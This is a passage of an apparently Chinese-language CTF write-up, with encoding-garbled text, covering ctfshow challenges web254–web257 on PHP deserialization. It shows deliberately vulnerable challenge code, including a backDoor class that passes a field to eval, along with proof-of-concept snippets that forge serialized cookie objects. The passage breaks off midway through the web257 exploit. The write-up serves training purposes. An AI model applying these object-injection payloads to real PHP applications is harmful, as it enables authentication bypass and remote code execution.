</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nt">__sleep</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">æ‰§è¡Œserialize</span><span class="o">()</span><span class="nt">æ—¶</span><span class="err">ï¼Œ</span><span class="nt">å…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nt">__wakeup</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">æ‰§è¡Œunserialize</span><span class="o">()</span><span class="nt">æ—¶</span><span class="err">ï¼Œ</span><span class="nt">å…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nt">__toString</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nt">__invoke</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nt">__set_state</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">è°ƒç”¨var_export</span><span class="o">()</span><span class="nt">å¯¼å‡ºç±»æ—¶</span><span class="err">ï¼Œ</span><span class="nt">æ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nt">__clone</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="nt">__autoload</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="nt">__debugInfo</span><span class="o">()</span><span class="err">ï¼Œ</span><span class="nt">æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span>
</span></span></code></pre></div><h4 id="web254">web254<a hidden class="anchor" aria-hidden="true" href="#web254">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 19:29:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkVip</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">vipOneKeyGetFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;your flag is &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;no vip, no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">checkVip</span><span class="p">()){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">vipOneKeyGetFlag</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;no vip,no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>çœ‹ç€å¾ˆé•¿ï¼Œå®é™…ä¸Šå®¡ä¸€ä¸‹ä»£ç å‘ç°è´¦å·å’Œå¯†ç å·²ç»æ”¾å‡ºæ¥äº†</p>
<pre tabindex="0"><code>    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
</code></pre><p>poc</p>
<pre tabindex="0"><code>/?username=xxxxxx&amp;password=xxxxxx
</code></pre><h4 id="web255">web255<a hidden class="anchor" aria-hidden="true" href="#web255">#</a></h4>
<p>ç›¸æ¯”ä¸Šä¸€é¢˜åªæ˜¯æŠŠ</p>
<pre tabindex="0"><code>$user = new ctfShowUser();
</code></pre><p>æ”¹ä¸ºäº†</p>
<pre tabindex="0"><code>$user = unserialize($_COOKIE[&#39;user&#39;]);
</code></pre><p>åŒºåˆ«ä¸å¤§åªéœ€è¦é€šè¿‡ååºåˆ—åŒ–çš„æ–¹å¼å®ä¾‹åŒ–ctfShowUser()å³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span> <span class="c1">//ä¸èƒ½æ¼
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</span></span></code></pre></div><p>ä¼ å‚æ‹¿åˆ°flag</p>
<h4 id="web256">web256<a hidden class="anchor" aria-hidden="true" href="#web256">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 19:29:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkVip</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">vipOneKeyGetFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">!==</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;your flag is &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;no vip, no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>    
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">checkVip</span><span class="p">()){</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">            <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">vipOneKeyGetFlag</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;no vip,no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç›¸æ¯”ä¸Šä¸€é“é¢˜å¤šäº†ä¸ª</p>
<pre tabindex="0"><code>$this-&gt;username!==$this-&gt;password
</code></pre><p>åŒºåˆ«ä¸å¤§</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s2">&#34;okok&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</span></span></code></pre></div><p>ä¼ å‚æ‹¿åˆ°flag</p>
<h4 id="web257">web257<a hidden class="anchor" aria-hidden="true" href="#web257">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 20:33:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">private</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">private</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">info</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="k">class</span> <span class="nc">info</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">private</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">private</span> <span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é“é¢˜å­˜åœ¨ä¸€ä¸ªåé—¨æ–¹æ³•</p>
<p>æˆ‘ä»¬æƒ³åŠæ³•èµ°åˆ°åé¢æ–¹æ³•è¿™ä¸€æ­¥ï¼Œå¹¶é€šè¿‡evalæ‰§è¡Œå‘½ä»¤å³å¯å¾—åˆ°flag</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 20:33:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;backDoor&#39;</span><span class="p">;</span>
